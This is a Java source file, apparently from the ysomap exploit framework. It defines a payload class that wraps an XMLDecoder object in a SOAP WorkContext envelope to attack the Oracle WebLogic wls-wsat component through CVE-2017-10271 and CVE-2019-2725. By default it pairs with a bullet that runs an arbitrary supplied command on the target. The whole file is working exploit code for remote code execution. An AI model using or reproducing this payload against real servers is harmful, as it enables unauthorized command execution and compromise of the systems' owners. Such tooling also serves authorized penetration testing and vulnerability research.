package ysomap.core.payload.xmldecoder;

import ysomap.common.annotation.Authors;
import ysomap.common.annotation.Dependencies;
import ysomap.common.annotation.Payloads;
import ysomap.common.annotation.Require;
import ysomap.core.bean.Bullet;
import ysomap.core.bean.Payload;
import ysomap.core.bullet.weblogic.xml.WeblogicXMLRCEBullet;
import ysomap.core.serializer.Serializer;
import ysomap.core.serializer.SerializerFactory;

/**
 * @author wh1t3P1g
 * @since 2021/4/8
 */
@Payloads
@Authors({ Authors.WH1T3P1G })
@Require(bullets = {"WeblogicXMLJndiBullet","WeblogicXMLRCEBullet"}, param = false)
@Dependencies({"weblogic cve-2017-10271 & CVE-2019-2725 for wls-wsat"})
public class WeblogicXML1 extends Payload<Object> {
    @Override
    public Object pack(Object obj) throws Exception {
        String payload = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"> \n" +
                "  <soapenv:Header> \n" +
                "\t<work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n" + obj +
                "\n</work:WorkContext> \n" +
                "  </soapenv:Header>  \n" +
                "  <soapenv:Body/> \n" +
                "</soapenv:Envelope>";
        return payload;
    }

    @Override
    public Bullet getDefaultBullet(String command) throws Exception {
        Bullet bullet = new WeblogicXMLRCEBullet();
        bullet.set("cmd", command);
        return bullet;
    }

    @Override
    public Serializer<?> getSerializer() {
        return SerializerFactory.createSerializer("xmldecoder");
    }
}
